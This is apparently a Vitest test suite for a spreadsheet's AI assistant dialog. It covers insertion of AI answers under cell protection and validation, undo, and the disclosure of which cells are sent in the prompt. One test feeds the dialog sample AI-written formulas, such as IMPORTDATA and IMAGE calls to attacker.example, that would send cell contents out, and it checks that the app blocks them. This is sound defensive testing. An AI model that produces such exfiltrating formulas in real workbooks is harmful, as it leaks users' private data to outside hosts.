// @vitest-environment jsdom
import { afterEach, beforeEach, expect, it, vi } from 'vitest';
import { Workbook } from '../src/core/workbook.js';
import { openAiDialog } from '../src/ui/aidialog.js';
import { closeAllModals } from '../src/ui/modal.js';
import { toast } from '../src/ui/toast.js';
import * as P from '../src/lib/puter.js';

vi.mock('../src/ui/toast.js', () => ({ toast: vi.fn() }));

beforeEach(() => {
  vi.useFakeTimers();
  vi.stubGlobal('matchMedia', () => ({ matches: true }));
  vi.spyOn(P, 'canAI').mockReturnValue(true);
  toast.mockClear();
  document.body.innerHTML = '<div id="app"></div>';
});

it.each([
  ['ask', 'sheet'], ['ask', 'range'], ['write', 'sheet'], ['write', 'range'],
])('keeps the %s result available when %s protection blocks insertion', async (mode, protection) => {
  const wb = new Workbook();
  const id = wb.activeSheetId;
  const range = { r1: 0, c1: 0, r2: 0, c2: 0 };
  wb.setInput(id, 0, 0, 'Original');
  const reply = mode === 'ask' ? 'An answer' : '=1+1';
  let resolve;
  vi.spyOn(P, 'aiChat').mockReturnValue(new Promise((done) => { resolve = done; }));
  const { panel } = openAiDialog({
    wb, sheetId: () => id, active: () => ({ r: 0, c: 0 }),
    range: () => range, grid: { focus() {} },
  }, { mode });
  panel.querySelector('textarea').value = 'Help with this cell';
  panel.querySelector('form').requestSubmit();
  const protectedRange = protection === 'range' ? wb.protectRange(id, range) : null;
  if (protection === 'sheet') wb.setSheetProtected(id, true);
  resolve(reply);
  await vi.advanceTimersByTimeAsync(0);
  const button = [...panel.querySelectorAll('button')].find((button) =>
    button.textContent === `${mode === 'ask' ? 'Write' : 'Insert'} into A1`);
  button.click();
  expect(wb.getValue(id, 0, 0)).toBe('Original');
  expect(panel.closest('.modal-root').classList.contains('closing')).toBe(false);
  expect(panel.querySelector('[role="alert"]').textContent).toMatch(/protected/i);
  expect(panel.querySelector('.ai-result').textContent).toBe(reply);
  expect(toast).not.toHaveBeenCalled();

  if (protection === 'sheet') wb.setSheetProtected(id, false);
  else wb.unprotectRange(id, protectedRange);
  button.click();
  expect(wb.getValue(id, 0, 0)).toBe(mode === 'ask' ? reply : 2);
  expect(toast).toHaveBeenCalledWith(expect.stringContaining('written into A1'), expect.anything());
});
afterEach(() => {
  closeAllModals();
  vi.clearAllTimers();
  vi.useRealTimers();
  vi.restoreAllMocks();
  vi.unstubAllGlobals();
  document.body.replaceChildren();
});

it.each(['=1+1', '00123', 'TRUE', "'Quoted answer"] )('writes the AI answer %j as displayed text, with undo', async (answer) => {
  const wb = new Workbook();
  const id = wb.activeSheetId;
  wb.setInput(id, 0, 0, 'Original');
  wb.applyStyle(id, { r1: 0, c1: 0, r2: 0, c2: 0 }, { bold: true });
  const before = wb.toJSON();
  wb.clearHistory();
  vi.spyOn(P, 'aiChat').mockResolvedValue(answer);
  const { panel } = openAiDialog({
    wb, sheetId: () => id, active: () => ({ r: 0, c: 0 }),
    range: () => ({ r1: 0, c1: 0, r2: 0, c2: 0 }), grid: { focus() {} },
  }, { mode: 'ask' });
  panel.querySelector('textarea').value = 'Summarize this cell';
  panel.querySelector('form').requestSubmit();
  await vi.advanceTimersByTimeAsync(0);
  [...panel.querySelectorAll('button')].find((button) => button.textContent === 'Write into A1').click();
  expect(wb.getCell(id, 0, 0)).toMatchObject({ v: answer, f: null, s: { bold: true } });
  wb.undo();
  expect(wb.toJSON()).toEqual(before);
  wb.redo();
  expect(wb.getValue(id, 0, 0)).toBe(answer);
});

it.each([
  [true, '=1+1', false],
  [undefined, 'Invalid', false],
  [false, 'Invalid', true],
  [true, 'Allowed', true],
])('checks AI answer validation with strict=%s and answer=%s', async (strict, answer, accepted) => {
  const wb = new Workbook();
  const id = wb.activeSheetId;
  const range = { r1: 0, c1: 0, r2: 0, c2: 0 };
  wb.setInput(id, 0, 0, 'Original');
  const ruleId = wb.addValidation(id, { range, type: 'list', source: 'Original,Allowed', strict });
  const before = wb.toJSON();
  wb.clearHistory();
  vi.spyOn(P, 'aiChat').mockResolvedValue(answer);
  const { panel } = openAiDialog({
    wb, sheetId: () => id, active: () => ({ r: 0, c: 0 }),
    range: () => range, grid: { focus() {} },
  }, { mode: 'ask' });
  panel.querySelector('textarea').value = 'Summarize this cell';
  panel.querySelector('form').requestSubmit();
  await vi.advanceTimersByTimeAsync(0);
  const button = [...panel.querySelectorAll('button')].find((button) => button.textContent === 'Write into A1');
  button.click();
  if (accepted) {
    expect(wb.getValue(id, 0, 0)).toBe(answer);
    expect(panel.closest('.modal-root').classList.contains('closing')).toBe(true);
    wb.undo();
    expect(wb.toJSON()).toEqual(before);
  } else {
    expect(wb.toJSON()).toEqual(before);
    expect(panel.closest('.modal-root').classList.contains('closing')).toBe(false);
    expect(panel.querySelector('[role="alert"]').hidden).toBe(false);
    expect(panel.querySelector('[role="alert"]').textContent).toBeTruthy();
    expect(panel.querySelector('.ai-result').textContent).toBe(answer);
    expect(toast).not.toHaveBeenCalled();
    wb.updateValidation(id, ruleId, { source: `Original,Allowed,${answer}` });
    button.click();
    expect(wb.getCell(id, 0, 0)).toMatchObject({ v: answer, f: null });
  }
});

// The prompt quotes the sheet's own cells, so a formula the AI writes could
// send their contents anywhere. Inserting one that reaches out closes the
// outside-content gate first, as pasting it from a web page does.
it.each([
  ['=IMPORTDATA("https://attacker.example/c?d="&ENCODEURL(A1))', 'IMPORTDATA', true],
  ['=GOOGLETRANSLATE(A1,"en","fr")', 'TRANSLATE', true],
  ['=IMAGE("https://attacker.example/p?d="&ENCODEURL(A1))', null, true],
  ['=SUM(A1:A3)', null, false],
])('inserting the AI formula %s asks before it reaches out: %s', async (reply, provider, reachesOut) => {
  const wb = new Workbook();
  const id = wb.activeSheetId;
  const asked = [];
  if (provider) wb.setAsyncProvider(provider, async (text) => { asked.push(text); return 'answer'; });
  wb.setInput(id, 0, 0, 'secret');
  vi.spyOn(P, 'aiChat').mockResolvedValue(reply);
  const doc = { distrustExternal: vi.fn(() => wb.setExternalAllowed(false)) };
  const { panel } = openAiDialog({
    wb, doc, sheetId: () => id, active: () => ({ r: 1, c: 0 }),
    range: () => ({ r1: 1, c1: 0, r2: 1, c2: 0 }), grid: { focus() {} },
  }, { mode: 'write' });
  panel.querySelector('textarea').value = 'Fetch the report';
  panel.querySelector('form').requestSubmit();
  await vi.advanceTimersByTimeAsync(0);
  [...panel.querySelectorAll('button')].find((button) => button.textContent === 'Insert into A2').click();
  await vi.advanceTimersByTimeAsync(0);
  expect(wb.getCell(id, 1, 0).f).toBe(reply.slice(1));
  expect(doc.distrustExternal).toHaveBeenCalledTimes(reachesOut ? 1 : 0);
  expect(wb.externalAllowed).toBe(!reachesOut);
  expect(asked).toEqual([]);
  if (provider) expect(wb.getValue(id, 1, 0)).toEqual({ error: '#BLOCKED!' });
});

// Writing or explaining a formula sends sample rows of the sheet along with its
// headers; the dialog says which, in step with what the prompt actually holds.
it.each(['write', 'explain'])('says which cells the %s prompt sends', async (mode) => {
  const wb = new Workbook();
  const id = wb.activeSheetId;
  const cells = [];
  for (let r = 0; r < 6; r++) for (let c = 0; c < 40; c++) cells.push({ r, c, cell: { v: r === 0 ? `H${c + 1}` : r * 100 + c } });
  wb.setCells(id, cells);
  if (mode === 'explain') wb.setInput(id, 7, 0, '=SUM(A2:A6)');
  const prompts = [];
  vi.spyOn(P, 'aiChat').mockImplementation(async (prompt) => { prompts.push(prompt); return mode === 'explain' ? 'It adds the numbers.' : '=SUM(A2:A6)'; });
  const { panel } = openAiDialog({
    wb, sheetId: () => id, active: () => ({ r: 7, c: 0 }),
    range: () => ({ r1: 7, c1: 0, r2: 7, c2: 0 }), grid: { focus() {} },
  }, { mode });
  const note = [...panel.querySelectorAll('.field-hint')].find((hint) => hint.textContent.startsWith('Data sent:'));
  expect(note.textContent).toBe('Data sent: headers in A1:AE1 and rows 2–4 of A:K on Sheet1, values as shown, with the names of the sheets, tables, and named ranges.');
  if (mode === 'write') { panel.querySelector('textarea').value = 'Total of column A'; panel.querySelector('form').requestSubmit(); }
  await vi.advanceTimersByTimeAsync(0);
  // The note describes the prompt: those rows, that many columns, and no more.
  const rows = prompts[0].split('\n').filter((line) => /^Row \d+:/.test(line));
  expect(rows.map((line) => Number(/^Row (\d+):/.exec(line)[1]))).toEqual([2, 3, 4]);
  for (const line of rows) expect(line.split(' | ')).toHaveLength(11);
  expect(prompts[0]).toContain('AE1="H31"');
  expect(prompts[0]).not.toContain('AF1=');
});

it.each([
  [[], 'Data sent: only the names of the sheets, tables, and named ranges; Sheet1 has no data.'],
  [[['Name', 'Qty', 'Price']], 'Data sent: headers in A1:C1 on Sheet1, values as shown, with the names of the sheets, tables, and named ranges.'],
  [[['Name', 'Qty'], ['Pen', 3]], 'Data sent: headers in A1:B1 and row 2 of A:B on Sheet1, values as shown, with the names of the sheets, tables, and named ranges.'],
])('describes the data sent for a small sheet %j', (rows, expected) => {
  const wb = new Workbook();
  const id = wb.activeSheetId;
  wb.setCells(id, rows.flatMap((row, r) => row.map((v, c) => ({ r, c, cell: { v } }))));
  const { panel } = openAiDialog({
    wb, sheetId: () => id, active: () => ({ r: 5, c: 0 }),
    range: () => ({ r1: 5, c1: 0, r2: 5, c2: 0 }), grid: { focus() {} },
  }, { mode: 'write' });
  const note = [...panel.querySelectorAll('.field-hint')].find((hint) => hint.textContent.startsWith('Data sent:'));
  expect(note.textContent).toBe(expected);
});
